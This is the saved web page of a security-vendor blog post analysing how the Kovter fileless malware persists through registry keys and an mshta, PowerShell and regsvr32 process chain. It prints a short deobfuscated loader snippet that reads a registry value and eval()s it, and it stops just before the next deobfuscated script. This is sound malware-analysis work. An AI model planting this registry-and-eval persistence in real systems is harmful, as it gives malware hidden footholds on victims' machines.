@@ -1,0 +1,601 @@
+
+
+<!doctype html>
+<html lang="en-US">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#00205b">
+  <link rel="icon" type="image/x-icon" href="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/favicon.ico">
+  <meta name="google-site-verification" content="6M82rbbHbywBWJVHqgvO876R2q328Cy5_-ITC4OKCYA" />
+  <meta name="msvalidate.01" content="F771E04128B3B728FD06490CB8D3A109" />
+      <link rel="alternate" href="https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/" hreflang="x-default" />
+  <link rel="alternate" hreflang="en" href="https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/" />
+  <link rel="alternate" hreflang="fr" href="https://airbus-cyber-security.com/fr/fileless-malware-behavioural-analysis-kovter-persistence/" />
+  <link rel="alternate" hreflang="de" href="https://airbus-cyber-security.com/de/fileless-malware-behavioural-analysis-kovter-persistence/" />
+    
+	<!-- This site is optimized with the Yoast SEO plugin v15.0 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Fileless Malware – A Behavioural Analysis Of Kovter Persistence - Airbus CyberSecurity</title>
+	<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+	<link rel="canonical" href="https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Fileless Malware – A Behavioural Analysis Of Kovter Persistence - Airbus CyberSecurity" />
+	<meta property="og:description" content="Background During a recent talk by a representative of MalwareBytes, it was discussed that several modern malware families, notable Poweliks, Phase Bot and Kovter are moving away from the file system and are instead establishing persistence in the registry of the host. This blog outlines the infection vector used by the kovter malware and the" />
+	<meta property="og:url" content="https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/" />
+	<meta property="og:site_name" content="Airbus CyberSecurity" />
+	<meta property="article:published_time" content="2016-03-23T22:40:27+00:00" />
+	<meta property="article:modified_time" content="2020-09-07T16:55:40+00:00" />
+	<meta property="og:image" content="https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter1_thumb.png" />
+	<meta name="twitter:card" content="summary" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://airbus-cyber-security.com/#website","url":"https://airbus-cyber-security.com/","name":"Airbus CyberSecurity","description":"Your Security, Our Priority","potentialAction":[{"@type":"SearchAction","target":"https://airbus-cyber-security.com/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/#primaryimage","inLanguage":"en-US","url":"https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter1_thumb.png","width":500,"height":91},{"@type":"WebPage","@id":"https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/#webpage","url":"https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/","name":"Fileless Malware \u2013 A Behavioural Analysis Of Kovter Persistence - Airbus CyberSecurity","isPartOf":{"@id":"https://airbus-cyber-security.com/#website"},"primaryImageOfPage":{"@id":"https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/#primaryimage"},"datePublished":"2016-03-23T22:40:27+00:00","dateModified":"2020-09-07T16:55:40+00:00","author":{"@id":"https://airbus-cyber-security.com/#/schema/person/49f94da9706a0f9ece16b39c4c3db299"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/"]}]},{"@type":"Person","@id":"https://airbus-cyber-security.com/#/schema/person/49f94da9706a0f9ece16b39c4c3db299","name":"mattdavies","image":{"@type":"ImageObject","@id":"https://airbus-cyber-security.com/#personlogo","inLanguage":"en-US","url":"https://secure.gravatar.com/avatar/e62b3ebffbd79a52d07815f06da3ae6c?s=96&d=mm&r=g","caption":"mattdavies"}}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='//www.google.com' />
+<link rel='dns-prefetch' href='//cdnjs.cloudflare.com' />
+<link rel='dns-prefetch' href='//cdn.jsdelivr.net' />
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="Airbus CyberSecurity &raquo; Fileless Malware – A Behavioural Analysis Of Kovter Persistence Comments Feed" href="https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/airbus-cyber-security.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.5.5"}};
+			!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([55357,56424,8205,55356,57212],[55357,56424,8203,55356,57212])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='https://airbus-cyber-security.com/wp-includes/css/dist/block-library/style.min.css?ver=5.5.5' type='text/css' media='all' />
+<link rel='stylesheet' id='wpml-legacy-horizontal-list-0-css'  href='//airbus-cyber-security.com/wp-content/plugins/sitepress-multilingual-cms/templates/language-switchers/legacy-list-horizontal/style.css?ver=1' type='text/css' media='all' />
+<link rel='stylesheet' id='magnific-popup-css'  href='https://cdnjs.cloudflare.com/ajax/libs/magnific-popup.js/1.1.0/magnific-popup.min.css' type='text/css' media='all' />
+<link rel='stylesheet' id='sage/css-css'  href='https://airbus-cyber-security.com/wp-content/themes/airbus/dist/styles/main.css' type='text/css' media='all' />
+<script type='text/javascript' src='https://www.google.com/recaptcha/api.js?ver=1' id='recaptcha-js'></script>
+<script type='text/javascript' src='https://airbus-cyber-security.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp' id='jquery-core-js'></script>
+<link rel="https://api.w.org/" href="https://airbus-cyber-security.com/wp-json/" /><link rel="alternate" type="application/json" href="https://airbus-cyber-security.com/wp-json/wp/v2/posts/589" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://airbus-cyber-security.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://airbus-cyber-security.com/wp-includes/wlwmanifest.xml" /> 
+
+<link rel='shortlink' href='https://airbus-cyber-security.com/?p=589' />
+<link rel="alternate" type="application/json+oembed" href="https://airbus-cyber-security.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fairbus-cyber-security.com%2Ffileless-malware-behavioural-analysis-kovter-persistence%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://airbus-cyber-security.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fairbus-cyber-security.com%2Ffileless-malware-behavioural-analysis-kovter-persistence%2F&#038;format=xml" />
+<meta name="generator" content="WPML ver:4.4.1 stt:1,4,3;" />
+<link rel="alternate" type="application/rss+xml" title="Airbus CyberSecurity &raquo; Google Image Sitemap" href="https://airbus-cyber-security.com/?feed=googleimagesitemap" />
+<link rel="alternate" type="application/rss+xml" title="Airbus CyberSecurity &raquo; Google Video Sitemap" href="https://airbus-cyber-security.com/?feed=googlevideossitemap" />
+<style>.post-thumbnail img[src$='.svg'] { width: 100%; height: auto; }</style><script type="text/javascript">
+  var ajaxurl = "https://airbus-cyber-security.com/wp-admin/admin-ajax.php";
+  </script><script type="text/javascript">
+  var getLangCode = "en";
+  </script><link rel="amphtml" href="https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/amp/">		<style type="text/css" id="wp-custom-css">
+			.inner .size {
+	display: none;
+}
+
+ul.inputs-list {
+	list-style-type:none;
+	padding-left: 0;
+}
+
+.post-copy .code-block p{
+	margin-bottom: 0 !important;
+}
+
+/* blockquote {
+	word-break: break-all;
+} */
+
+.single-news  blockquote {
+	word-break: normal;
+	padding: 5px 15px 5px 15px;
+}
+
+.wp-block-preformatted {
+	white-space: pre-wrap;
+}
+
+.inv-proj-column {
+  float: left;
+  width: 50%;
+}
+
+.inv-proj:after {
+  content: "";
+  display: table;
+  clear: both;
+}
+
+.inv-proj-more h6{
+	color: #82AD4F
+}
+
+.whitepaper-form h3 {
+	color: #00205b;
+}
+
+body.page-template-template-careers h2.sub-heading {
+	margin-bottom: 1rem;
+}
+
+blockquote {
+	margin-top: 1rem;
+}
+
+main.main th {
+	font-weight: 300;
+}
+
+.layoutArea {
+	margin-top: 1rem;
+}
+
+#careers-page h2, h3 {
+	color: #00205b;
+}		</style>
+		  <!--[if lte IE 8]>
+  <script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2-legacy.js"></script>
+  <![endif]-->
+  <script charset="utf-8" type="text/javascript" src="//js.hsforms.net/forms/v2.js"></script>
+  <script type="text/javascript" src="http://www.ride8stir.com/js/211131.js" ></script>
+  <!-- Google Tag Manager -->
+<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
+new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
+j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
+'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
+})(window,document,'script','dataLayer','GTM-K9SG7PX');</script>
+<!-- End Google Tag Manager -->
+
+</head>
+<body class="post-template-default single single-post postid-589 single-format-standard fileless-malware-behavioural-analysis-kovter-persistence sidebar-primary">
+<noscript><img alt="" src="http://www.ride8stir.com/211131.png" style="display:none;" /></noscript>
+<!-- Google Tag Manager (noscript) -->
+<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-K9SG7PX"
+height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
+<!-- End Google Tag Manager (noscript) -->
+    <!--[if IE]>
+    <div class="alert alert-warning">
+    You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.  </div>
+  <![endif]-->
+    
+  <div class="cookies">
+    <i class="fa fa-times-circle-o" aria-hidden="true"></i>
+    <div class="container">
+          <p>In order to give you a better service Airbus uses cookies. By continuing to browse the site you are agreeing to our use of cookies.
+      <a href="https://airbus-cyber-security.com/privacy-policy">I agree</a></p>
+      <p class="opt-out">To opt out of Google Analytics data collection, <a href="#">click here</a></p>
+      <p class="opt-out-success">Thanks. We have set a cookie so that Google Analytics data collections will be disabled on your next visit.</p>
+     
+    </div>
+  </div>
+  
+  
+<header class="banner">
+  <div class="container">
+    <div class="row">
+    <a class="brand" aria-label="Home" href="https://airbus-cyber-security.com/"></a>
+
+     <button class="hamburger hamburger--squeeze menu-toggle" type="button">
+        <span class="hamburger-box">
+          <span class="hamburger-inner"></span>
+        </span>
+      </button>
+
+      <div class="lang_selector"><a  href="https://airbus-cyber-security.com/de/fileless-malware-behavioural-analysis-kovter-persistence/">DE</a> | <a  class="active" href="https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/">EN</a> | <a  href="https://airbus-cyber-security.com/fr/fileless-malware-behavioural-analysis-kovter-persistence/">FR</a></div>
+       <form role="search" method="get" class="search" action="https://airbus-cyber-security.com/">
+        <input type="search" class="form-control" placeholder="search" value="" name="s" title="search" />
+        <button type="submit" aria-label="Search" class="search-submit"><i class="fa fa-search" aria-hidden="true"></i></button>
+      </form>
+
+
+    <div class="thin-bar"></div>
+    <div class="thick-bar"></div>
+
+    <nav class="nav-primary">
+
+      <form role="search" method="get" class="search-form" action="https://airbus-cyber-security.com/">
+        <input type="search" class="search-field" placeholder="search" value="" name="s" title="search" />
+        <input type="submit" class="search-submit" value="search">
+      </form>
+
+      <div class="menu-primary-navigation-container"><ul id="menu-primary-navigation" class="nav"><li id="menu-item-29" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-29"><a href="https://airbus-cyber-security.com/industries/">Industries</a>
+<ul class="sub-menu">
+	<li id="menu-item-175" class="menu-item menu-item-type-post_type menu-item-object-industries menu-item-175"><a href="https://airbus-cyber-security.com/industries/defence-and-governments/">Defence &#038; Governments</a></li>
+	<li id="menu-item-174" class="menu-item menu-item-type-post_type menu-item-object-industries menu-item-174"><a href="https://airbus-cyber-security.com/industries/aeronautics-and-space/">Aeronautics and Space</a></li>
+	<li id="menu-item-173" class="menu-item menu-item-type-post_type menu-item-object-industries menu-item-173"><a href="https://airbus-cyber-security.com/industries/transportation/">Transportation</a></li>
+	<li id="menu-item-172" class="menu-item menu-item-type-post_type menu-item-object-industries menu-item-172"><a href="https://airbus-cyber-security.com/industries/industry/">Industry</a></li>
+	<li id="menu-item-171" class="menu-item menu-item-type-post_type menu-item-object-industries menu-item-171"><a href="https://airbus-cyber-security.com/industries/energy-and-utilities/">Energy and Utilities</a></li>
+</ul>
+</li>
+<li id="menu-item-31" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31"><a href="https://airbus-cyber-security.com/products-and-services/">Products &#038; Services</a>
+<ul class="sub-menu">
+	<li id="menu-item-1711" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-has-children menu-item-1711"><a href="https://airbus-cyber-security.com/products-and-services/prevent/">Prevent</a>
+	<ul class="sub-menu">
+		<li id="menu-item-5084" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-5084"><a href="https://airbus-cyber-security.com/products-and-services/prevent/cyberrange/">CyberRange</a></li>
+		<li id="menu-item-1713" class="scroll menu-item menu-item-type-post_type menu-item-object-products menu-item-1713"><a href="https://airbus-cyber-security.com/products-and-services/prevent/">Cyber Threat Intelligence</a></li>
+		<li id="menu-item-7304" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-7304"><a href="https://airbus-cyber-security.com/products-and-services/prevent/vulnerability-research/">Vulnerability Research</a></li>
+	</ul>
+</li>
+	<li id="menu-item-196" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-has-children menu-item-196"><a href="https://airbus-cyber-security.com/products-and-services/protect/">Protect</a>
+	<ul class="sub-menu">
+		<li id="menu-item-330" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-330"><a href="https://airbus-cyber-security.com/products-and-services/protect/">High Grade Encryption</a></li>
+		<li id="menu-item-328" class="scroll menu-item menu-item-type-post_type menu-item-object-products menu-item-328"><a href="https://airbus-cyber-security.com/products-and-services/protect/">Key Management</a></li>
+		<li id="menu-item-329" class="scroll menu-item menu-item-type-post_type menu-item-object-products menu-item-329"><a href="https://airbus-cyber-security.com/products-and-services/protect/">Secure Exchange Gateway</a></li>
+		<li id="menu-item-2030" class="scroll menu-item menu-item-type-post_type menu-item-object-products menu-item-2030"><a href="https://airbus-cyber-security.com/products-and-services/protect/">Stormshield</a></li>
+	</ul>
+</li>
+	<li id="menu-item-188" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-has-children menu-item-188"><a href="https://airbus-cyber-security.com/products-and-services/detect/">Detect</a>
+	<ul class="sub-menu">
+		<li id="menu-item-5153" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-5153"><a href="https://airbus-cyber-security.com/products-and-services/detect/cymerius/">Cymerius</a></li>
+		<li id="menu-item-7413" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-7413"><a href="https://airbus-cyber-security.com/products-and-services/detect/digital-risk-protection/">Digital Risk Protection</a></li>
+		<li id="menu-item-10764" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-10764"><a href="https://airbus-cyber-security.com/products-and-services/detect/deceptive-security/">Deceptive Security</a></li>
+		<li id="menu-item-3717" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-3717"><a href="https://airbus-cyber-security.com/products-and-services/detect/orion-malware/">Orion Malware</a></li>
+		<li id="menu-item-7000" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-7000"><a href="https://airbus-cyber-security.com/products-and-services/detect/security-operations-centre-soc/">Security Operations Centre (SOC)</a></li>
+	</ul>
+</li>
+	<li id="menu-item-189" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-has-children menu-item-189"><a href="https://airbus-cyber-security.com/products-and-services/respond/">Respond</a>
+	<ul class="sub-menu">
+		<li id="menu-item-1632" class="scroll menu-item menu-item-type-post_type menu-item-object-products menu-item-1632"><a href="https://airbus-cyber-security.com/products-and-services/respond/">Cyber On-Demand</a></li>
+		<li id="menu-item-1633" class="scroll menu-item menu-item-type-post_type menu-item-object-products menu-item-1633"><a href="https://airbus-cyber-security.com/products-and-services/respond/">Incident Response</a></li>
+		<li id="menu-item-1635" class="scroll menu-item menu-item-type-post_type menu-item-object-products menu-item-1635"><a href="https://airbus-cyber-security.com/products-and-services/respond/">Forensic Assessment</a></li>
+		<li id="menu-item-10440" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-10440"><a href="https://airbus-cyber-security.com/products-and-services/respond/penetration-test/">Penetration Test</a></li>
+	</ul>
+</li>
+	<li id="menu-item-7522" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-7522"><a href="https://airbus-cyber-security.com/products-and-services/industrial-control-systems/">OT Security</a></li>
+	<li id="menu-item-191" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-has-children menu-item-191"><a href="https://airbus-cyber-security.com/products-and-services/consultancy/">Consulting Services</a>
+	<ul class="sub-menu">
+		<li id="menu-item-3616" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-3616"><a href="https://airbus-cyber-security.com/products-and-services/consultancy/cyber-security-exercises/">Cyber Security Exercises</a></li>
+		<li id="menu-item-4007" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-4007"><a href="https://airbus-cyber-security.com/products-and-services/consultancy/cyber-incident-games/">Cyber Incident Games</a></li>
+		<li id="menu-item-3684" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-3684"><a href="https://airbus-cyber-security.com/products-and-services/consultancy/it-security-awareness/">IT/OT Security Awareness Training</a></li>
+		<li id="menu-item-4006" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-4006"><a href="https://airbus-cyber-security.com/products-and-services/consultancy/social-engineering-penetration-tests/">Social Engineering Penetration Tests</a></li>
+	</ul>
+</li>
+	<li id="menu-item-8218" class="menu-item menu-item-type-post_type menu-item-object-products menu-item-8218"><a href="https://airbus-cyber-security.com/products-and-services/innovation/">Innovation</a></li>
+</ul>
+</li>
+<li id="menu-item-25" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-25"><a href="https://airbus-cyber-security.com/about/">About Us</a></li>
+<li id="menu-item-30" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-30"><a href="https://airbus-cyber-security.com/news-and-events/">News &#038; Events</a>
+<ul class="sub-menu">
+	<li id="menu-item-2327" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2327"><a href="https://airbus-cyber-security.com/events/">Events</a></li>
+</ul>
+</li>
+<li id="menu-item-32" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-32"><a href="https://airbus-cyber-security.com/resources/">Resources</a>
+<ul class="sub-menu">
+	<li id="menu-item-5612" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-5612"><a href="https://airbus-cyber-security.com/resources/">Data Sheets</a></li>
+	<li id="menu-item-5611" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-5611"><a href="https://airbus-cyber-security.com/resources/?whitepapers">Whitepapers</a></li>
+</ul>
+</li>
+<li id="menu-item-26" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-26"><a href="https://airbus-cyber-security.com/blog/">Blog</a></li>
+<li id="menu-item-3988" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-3988"><a href="https://airbus-cyber-security.com/cyber-security-jobs-careers/">Jobs &#038; Careers</a></li>
+<li id="menu-item-27" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-27"><a href="https://airbus-cyber-security.com/contact-us/">Contact Us</a></li>
+</ul></div>    </nav>
+  </div>
+  </div>
+</header>
+  <div class="wrap" role="document">
+      <div class="container">
+                      <header class="page">
+        <div class="row">
+            <div class="col-md-12 col-lg-7 col-xl-9">
+                                    <h1>Fileless Malware – A Behavioural Analysis Of Kovter Persistence</h1>                                                                    <span class="pub-date">
+                        Published:23/03/16                    </span>
+                                                              
+            </div>
+        
+            <div class="col-md-12 col-lg-5 col-xl-3">
+
+                  
+
+                <div class="share">
+                    <strong>Share:</strong>
+                    <ul>
+                        <li><a target="_blank" rel="noopner noreferrer" href="http://twitter.com/home/?status=Fileless Malware – A Behavioural Analysis Of Kovter Persistence - https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/"><img src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/twitter.svg"></a></li>
+                        <li><a target="_blank" rel="noopner noreferrer" href="http://www.facebook.com/sharer.php?u=https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/&amp;t=Fileless Malware – A Behavioural Analysis Of Kovter Persistence"><img src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/facebook.svg"></a></li>
+                        <li><a target="_blank" rel="noopner noreferrer" href="https://www.linkedin.com/shareArticle?mini=true&url=https://airbus-cyber-security.com/fileless-malware-behavioural-analysis-kovter-persistence/&title=Fileless Malware – A Behavioural Analysis Of Kovter Persistence&summary="><img src="https://airbus-cyber-security.com/wp-content/themes/airbus/dist/images/linkedin.svg"></a></li>
+                    </ul>
+                </div>
+
+            
+            </div>
+        </div>  
+    </header>
+            <div class="row">
+        <main class="main">
+        
+<div class="container">
+    <div class="row">
+        <div class="col-sm-12">
+                            <section class="post-copy">
+
+                    
+                    
+                    <em>by Andrew Dove</em>
+
+                    <div data-mh="tags">
+            <ul class="tags py-3">
+                            <li><a href="https://airbus-cyber-security.com/tag/malware/">Malware</a></li>
+                          <li>/</li>
+                                <li><a href="https://airbus-cyber-security.com/tag/threat/">Threat</a></li>
+                          <li>/</li>
+                                <li><a href="https://airbus-cyber-security.com/tag/windows/">Windows</a></li>
+                          </ul>
+  </div>
+                    
+                    <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html><body><div class="post-excerpt">
+<h3>Background</h3>
+<p>During a recent talk by a representative of MalwareBytes, it was discussed that several modern malware families, notable Poweliks, Phase Bot and Kovter are moving away from the file system and are instead establishing persistence in the registry of the host. This blog outlines the infection vector used by the kovter malware and the analysis method used to investigate it.</p>
+</div>
+<div class="post-content">
+<h3>Analysis</h3>
+<h4>Lab Setup</h4>
+<p>The analysis of the malware was conducted on the REMWorkstation VM from the SANS FOR610 course as this comes preconfigured with a healthy collection of monitoring tools. A clean snapshot of the VM was used with Process Monitor, CaptureBat and ProcessHacker all running in order to observe the execution. No network connectivity was present.</p>
+<h4>Infection</h4>
+<p>The malware was executed using the Administrator account in order to allow it freedom to demonstrate a full range of behaviour. The process was allowed to run for approximately 60 seconds.</p>
+<h4>Analysis</h4>
+<p>Observing the infection in Process Monitor it was possible to see the following processes execute:</p>
+<ol><li>poss_kovter.exe</li>
+<li>poss_kovter.exe</li>
+<li>wmiprvse.exe</li>
+<li>mshta.exe</li>
+<li>powershell.exe</li>
+<li>regsvr32.exe</li>
+<li>regsvr32.exe</li>
+</ol><p>Loading the CSV into ProcDot and selecting the original kovter process as the initiating process produced the following graph (Please see the attachments to this post for full size versions of the images).</p>
+<p><img loading="lazy" class="lazy alignleft size-full wp-image-6738" src="https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter1_thumb.png" alt="" width="500" height="91" srcset="https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter1_thumb.png 500w, https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter1_thumb-300x55.png 300w" sizes="(max-width: 500px) 100vw, 500px"></p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<p>Interestingly although it is possible to see the second copy of the kovter process running here there are no references to starting the other processes, observed in Process Hacker. It appears that the second copy of kovter invokes the mshta.exe via the Windows Management Interface (WMI).</p>
+<p>Of particular interest were the various registry keys created by the process. In this particular instance they were all created under the HKLM\Software Key.</p>
+<p>Examining the first of the two regsvr32.exe processes we can see that a thread is started and a copy of the original kovter executable is loaded into it. This is then used to start a second process hollowed version of regsvr32.exe.</p>
+<p><img loading="lazy" class="lazy alignleft size-full wp-image-6742" src="https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter2_thumb.png" alt="" width="642" height="290" srcset="https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter2_thumb.png 642w, https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter2_thumb-300x136.png 300w" sizes="(max-width: 642px) 100vw, 642px"></p>
+<p>As this still didn&rsquo;t demonstrate the expected use of powershell it was decided to examine the WMI Service (wmiprvse.exe).</p>
+<p>It was not possible to load the graph for this process without disabling the display of registry keys. This gave the following graph (split into 3 to allow easier viewing).</p>
+<p><img loading="lazy" class="lazy alignnone size-full wp-image-6745" src="https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter3_thumb.png" alt="" width="656" height="194" srcset="https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter3_thumb.png 656w, https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter3_thumb-300x89.png 300w" sizes="(max-width: 656px) 100vw, 656px"></p>
+</div>
+<p><img loading="lazy" class="lazy alignnone size-full wp-image-6748" src="https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter4_thumb.png" alt="" width="689" height="150" srcset="https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter4_thumb.png 689w, https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter4_thumb-300x65.png 300w" sizes="(max-width: 689px) 100vw, 689px"></p>
+<div class="post-content">
+<p><img loading="lazy" class="lazy alignnone size-full wp-image-6751" src="https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter5_thumb.png" alt="" width="691" height="177" srcset="https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter5_thumb.png 691w, https://airbus-cyber-security.com/wp-content/uploads/2016/03/kovter5_thumb-300x77.png 300w" sizes="(max-width: 691px) 100vw, 691px"></p>
+<p>As demonstrated in these graphs this results in The Microsoft Scripting Engine (mshta.exe) is invoked through WMI, which in turn uses Powershell to start the previously observed regsvr32.exe, with the injected kovter payload.</p>
+<p>As ProcDot was unable to display the registry keys it was necessary to manually examining the information from the CSV file output by Process Monitor. As kovter uses the registry for persistence, the CSV file was searched for RegSetValue operations with &ldquo;mshta&rdquo; in the details. This produced the following results:</p>
+<p><img loading="lazy" class="lazy alignnone size-full wp-image-6754" src="https://airbus-cyber-security.com/wp-content/uploads/2016/03/RegKeys.png" alt="" width="632" height="200" srcset="https://airbus-cyber-security.com/wp-content/uploads/2016/03/RegKeys.png 632w, https://airbus-cyber-security.com/wp-content/uploads/2016/03/RegKeys-300x95.png 300w" sizes="(max-width: 632px) 100vw, 632px"></p>
+<p>Interestingly these keys cannot be recovered from regedit or the &ldquo;reg query&rdquo; command line tool as they include a non-ascii character in the subkey name. This is also what causes the problem with rendering in ProcDot. Although each key uses a slightly different obfuscation , when deobfuscated they all feature the same code:</p>
+<pre>ScriptingShell = new ActiveXObject("Wscript.Shell");
+Payload = ScriptingShell.RegRead("HKLM\software\ZyxLQz1U8xBw4Pco");
+eval(Payload);
+</pre>
+<p>Note that this registry value is random and is unique to the infection. It corresponds to one of the values seen in the ProcDot graph for the original infection.</p>
+<p>This registry key contains further obfuscated javascript which once cleaned up appears thus:</p>
